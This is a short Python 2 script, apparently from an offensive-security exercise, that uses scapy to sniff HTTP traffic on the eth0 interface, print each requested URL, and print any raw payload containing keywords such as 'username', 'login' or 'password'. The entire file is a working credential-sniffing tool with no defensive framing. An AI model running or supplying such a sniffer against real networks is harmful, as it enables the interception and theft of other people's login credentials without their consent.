#!/usr/bin/python
### RUN AS PY2 ###

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn= sniffedpack)
    
def get_url(packet):    
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['username','uname','Username','USERNAME','login','password','pass','Password','Pass']
        for e in keywords:
            if e in load:
                return load
                
def sniffedpack(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('url > ' + url)
        
        login_info = get_login(packet)
        if login_info:
            print('\nPossible > ' + login_info + '\n')


sniff('eth0')
